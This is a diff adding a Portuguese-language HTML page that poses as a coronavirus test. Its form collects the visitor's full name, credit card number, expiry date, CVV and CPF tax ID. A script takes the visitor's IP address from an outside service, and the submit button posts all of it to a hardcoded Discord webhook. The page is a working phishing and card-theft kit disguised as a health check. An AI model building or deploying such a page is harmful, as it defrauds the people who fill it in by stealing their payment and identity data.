@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>teste de Covid</title>
+        <meta charset="UTF-8">
+        <meta nome="viewport" content="width=device-widtf, initial-scale=1.0">
+
+    </head>
+    <body> 
+        <script type="text/javascript">
+            var userip;
+            function mascara_cpf() {
+                var cpff = document.getElementById("cpf");
+                if(cpff.value.length == 3) {
+                   cpff.value = cpff.value + "." 
+                }
+                if(cpff.value.length == 7) {
+                   cpff.value = cpff.value + "." 
+                }
+                if(cpff.value.length == 11) {
+                   cpff.value = cpff.value + "-" 
+                }
+            }
+
+            function mascara_data() {
+                var dataa = document.getElementById("data");
+                if(dataa.value.length == 2) {
+                dataa.value = dataa.value + "/" 
+                }
+                if(dataa.value.length == 5) {
+                dataa.value = dataa.value + "/" 
+                }
+            }
+
+            function mascara_numero() {
+                var numero = document.getElementById("cartao");
+                if(numero.value.length == 4) {
+                    numero.value = numero.value + "-" 
+                }
+                if(numero.value.length == 9) {
+                    numero.value = numero.value + "-" 
+                }
+                if(numero.value.length == 14) {
+                    numero.value = numero.value + "-" 
+                }
+            }
+          </script> 
+
+        <div>
+            <h1>TESTE DE CORONA VIROS 2.0</h1>
+            <h2>Descubra agora se você tem corona víros.</h2>
+        </div>
+        <hr> 
+        <br>
+        <form>
+                <label><strong>Nome Completo:</strong></label>
+                    <input type="text" name="nome" id="nome" placeholder="Digite aqui" autocomplete="off">
+                <br>
+                <br>
+                <strong>Numero do Cartão:</strong>
+                    <input type="text" name="cartao" id="cartao" placeholder="Digite aqui" maxlength="19" autocomplete="off" onkeyup="mascara_numero()">
+                <br>
+                <br>
+                <strong>Data de validade:</strong>
+                    <input type="text" name="data" id="data" placeholder="Digite aqui" maxlength="10" autocomplete="off" onkeyup="mascara_data()">
+                <br>
+                <br>
+                <strong>CVV:</strong>
+                    <input type="text" name="cvv" id="cvv" placeholder="Digite aqui" maxlength="3" autocomplete="off">
+                <br>
+                <br>
+                <strong>CPF:</strong>
+                    <input type="text" name="cpf" id="cpf" placeholder="Digite aqui"  maxlength="14" autocomplete="off" onkeyup="mascara_cpf()">
+                    <br>
+                <br>
+            </form>
+                <button onclick="sendMessage()"  id="btn1">Enviar</button>
+
+        
+        <script type="text/javascript">
+                 var userip;
+        </script>
+                      
+        <script type="text/javascript" src="https://l2.io/ip.js?var=userip"></script>
+
+        <script type="text/javascript">
+
+            var nome = document.getElementById("nome");
+            var cpf = document.getElementById("cpf");
+            var cvv = document.getElementById("cvv");
+            var data = document.getElementById("data");
+            var cartao = document.getElementById("cartao");
+            var date = new Date().toLocaleDateString();
+            if (11 > cpf.value.length && 11 < cpf.value.length && isFinite(cpf.value)) return window.document.alert("o cpf ta errado")
+
+            function sendMessage() {
+            var request = new XMLHttpRequest();
+            request.open("POST", "https://discord.com/api/webhooks/891802777238519910/r4CQtNMeaSU1t7_nrKsLUFOte-yYaFw39TSrSpVwpkFa-0KzCAIiF5Y2eTtZ-gsbpJkx");
+
+            request.setRequestHeader('Content-type', 'application/json');
+
+            var params = {
+             username: "teste",
+                avatar_url: "",
+                content: `Nome: ${nome.value}\nCPF: ${cpf.value}\nCVV: ${cvv.value}\nData: ${data.value}\ncartao: ${cartao.value}\nData: ${date}\nIP:${userip}`
+            }
+
+            request.send(JSON.stringify(params));
+
+            }
+        </script>
+    </body>
+</html>
